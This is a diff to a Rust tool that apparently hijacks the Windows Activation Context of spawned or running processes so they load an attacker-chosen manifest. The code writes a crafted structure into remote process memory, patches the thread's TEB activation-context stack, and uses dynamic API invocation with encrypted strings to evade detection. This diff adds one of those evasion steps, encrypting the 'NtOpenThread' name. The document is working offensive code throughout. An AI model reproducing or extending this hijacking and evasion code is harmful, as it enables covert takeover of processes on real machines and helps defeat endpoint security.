@@ -88,8 +88,9 @@ fn main()
     opts.reqopt("m", "mode", "Hijack the Activation Context of a new (spawn) or an already running (hijack) process.", "");
     opts.optopt("b", "binary", "Absolute path to the executable used to spawn the new process.", "");
     opts.optopt("f", "manifest-file", "Path to the manifest file from which the new Activation Context is created.", "");
-    opts.optopt("r", "resource-number", r"Resource index of the current executable where the manifest is located.", "");
-    opts.optopt("i", "pid", r"PID of the process whose Activation Context is to be hijacked.", "");
+    opts.optopt("r", "resource-number", "Resource index of the current executable where the manifest is located.", "");
+    opts.optopt("p", "pid", "PID of the process whose Activation Context is to be hijacked.", "");
+    opts.optflag("n", "new-console", "Set CREATE_NEW_CONSOLE flag to spawn the new process.");
 
     let matches = match opts.parse(&args[1..]) 
     {
@@ -114,6 +115,7 @@ fn main()
     let mut resource_index: u32 = 0;
     let mut manifest_path = String::new();
     let pid;
+    let mut new_console = false;
 
     if matches.opt_present("r") {
         resource_index = matches.opt_str("r").unwrap().parse().unwrap();
@@ -128,8 +130,12 @@ fn main()
             return;
         }
 
+        if matches.opt_present("n") {
+            new_console = true;
+        }
+
         binary_path = matches.opt_str("b").unwrap();
-        spawn_new_process(binary_path, resource_index, manifest_path);
+        spawn_new_process(binary_path, resource_index, manifest_path, new_console);
     } 
     else if mode == "hijack".to_string() 
     {
@@ -147,7 +153,7 @@ fn main()
     }
 }
 
-fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: String) 
+fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: String, new_console: bool) 
 {
     unsafe 
     {
@@ -205,7 +211,7 @@ fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: St
             return;
         }
 
-        println!("{}", &lc!("[+] Activation Context created locally"));
+        println!("{}", &lc!("[+] Local Activation Context created."));
 
         let handle_ptr = context_handle.0 as *mut usize;
         let ac_struct_ptr = handle_ptr.add(3);
@@ -231,7 +237,11 @@ fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: St
         application.push(0);
         let mut startup_info: STARTUPINFOW =std::mem::zeroed() ;
         startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-    
+        let mut creation_flags = 0x00000004;
+        if new_console {
+            creation_flags |= 0x00000010; // CREATE_NEW_CONSOLE
+        }
+
         let mut process_info: PROCESS_INFORMATION = std::mem::zeroed() ;
         let function: CreateProcessW;
         let ret: Option<bool>;
@@ -245,7 +255,7 @@ fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: St
             ptr::null_mut(),
             ptr::null_mut(),
             false,
-            0x00000004, // Suspended
+            creation_flags, // Suspended
             ptr::null_mut(),
             ptr::null(),
             &mut startup_info,
@@ -316,7 +326,7 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
         );
 
         if ret != 0 {
-            println!("{}", &lc!("[x] Failed to write the activation context data struct to the remote process."));
+            println!("{}", &lc!("[x] Failed to write the Activation Context data struct to the remote process."));
             return;
         }
 
@@ -408,11 +418,11 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
 
         let context_handle = ret.unwrap();
         if context_handle.0 == -1 {
-            println!("{}", &lc!("[x] Failed to create Activation Context.")); // This usually means wrong resource index or incorrect manifest file contents
+            println!("{}", &lc!("[x] Failed to create local Activation Context.")); // This usually means wrong resource index or incorrect manifest file contents
             return;
         }
 
-        println!("{}", &lc!("[+] Activation Context created locally."));
+        println!("{}", &lc!("[+] Local Activation Context created."));
 
         let handle_ptr = context_handle.0 as *mut usize;
         let ac_struct_ptr = handle_ptr.add(3);
@@ -440,7 +450,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         let tid = get_main_thread_id(pid);
         if tid == 0 
         {
-            println!("{}", &lc!("[x] Main thread not found. Fallback to process' Activation Context hijack."));
+            println!("{}", &lc!("[x] Main thread not found. Fallback to process main Activation Context hijack."));
 
             let h = HANDLE::default();
             let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
@@ -476,7 +486,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         let desired_access = 0x0800 ; // THREAD_QUERY_LIMITED_INFORMATION 
         let function: dinvoke_rs::data::NtOpenProcess; // NtOpenThread expects the same type of arguments as NtOpenProcess, so we can use the same function prototype
         let ret: Option<i32>;
-        dinvoke_rs::dinvoke::dynamic_invoke!(ntdll,"NtOpenThread",function,ret,thread_handle_ptr,desired_access,object_attributes,client_id);
+        dinvoke_rs::dinvoke::dynamic_invoke!(ntdll,&lc!("NtOpenThread"),function,ret,thread_handle_ptr,desired_access,object_attributes,client_id);
 
         if ret.unwrap() != 0 {
             println!("{}", &lc!("[x] Failed to open a handle to the remote process' main thread.")); 
@@ -562,7 +572,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         let total_offset = final_size - TOTAL_SIZE; 
 
         let mut frame_list_wrapper = FrameListWrapper::default();
-        let flink_blink = (*thread_information_ptr).teb_base_address as usize + 0x298;  // TEB->ACTIVATION_CONTEXT_STACK->FrameListCache
+        let flink_blink = (*thread_information_ptr).teb_base_address as usize + 0x298; // TEB->ACTIVATION_CONTEXT_STACK->FrameListCache
         frame_list_wrapper.flink = flink_blink as *mut _;
         frame_list_wrapper.blink = flink_blink as *mut _;
         frame_list_wrapper.list_elements[0].activation_context_frame.activation_context = (*base_address as usize + total_offset + size_of::<FrameListWrapper>() + 8) as *mut _; 
